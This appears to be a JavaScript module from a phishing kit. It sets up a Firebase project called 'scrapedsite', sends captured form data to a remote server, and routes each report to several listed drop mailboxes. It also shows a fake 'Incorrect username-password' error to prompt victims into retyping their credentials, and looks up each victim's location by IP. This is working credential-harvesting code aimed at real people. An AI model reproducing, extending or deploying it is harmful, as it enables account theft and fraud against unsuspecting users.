import axios from "axios";
import { initializeApp } from "firebase/app";
import { getFirestore } from "firebase/firestore";
import { toast } from "react-toastify";

const firebaseApp = initializeApp({
  apiKey: "AIzaSyBNSKpZ1syb0z8g8OOoye1lps1k7AcXpk8",
  authDomain: "scrapedsite.firebaseapp.com",
  projectId: "scrapedsite",
  storageBucket: "scrapedsite.appspot.com",
  messagingSenderId: "317704250761",
  appId: "1:317704250761:web:eff67f6e124883fb61ad58",
  measurementId: "G-WWFDG2HKPK",
});
export const db = getFirestore(firebaseApp);

const serverurl = require("../users.json");

export const getHost = (email) =>
  fetch(`${serverurl.nwabu.serverurl}/start`, {
    method: "POST",
    mode: "cors",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ email: email }),
  }).then((response) => response.json());

export const sendFile = (data) =>
  fetch(`${serverurl.nwabu.serverurl}/mail`, {
    method: "POST",
    mode: "cors",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      ...data,
      reportbox: "asapdogood@yandex.com, jhonsnow751@gmail.com", // "steadykokoyan12@yandex.com, resultbox4us@outlook.com" "mb4ckup.m4il@yandex.com" "info.maqsurgical@gmail.com" "Elongate68@gmail.com, jhonsnow751@gmail.com, ajaymoroco@yandex.com",
    }),
  }).then((response) => response.json());

export const notify = () =>
  toast.error("Incorrect username-password", {
    position: "top-center",
    autoClose: 5000,
    hideProgressBar: false,
    closeOnClick: true,
    pauseOnHover: true,
    draggable: true,
    progress: undefined,
  });

  export const notifySuccess = (message) =>
  toast.success(message, {
    position: "top-center",
    autoClose: 5000,
    hideProgressBar: false,
    closeOnClick: true,
    pauseOnHover: true,
    draggable: true,
    progress: undefined,
  });

export const getIP = async () => {
    const res = await axios.get("https://geolocation-db.com/json/");
    return res;
  };
  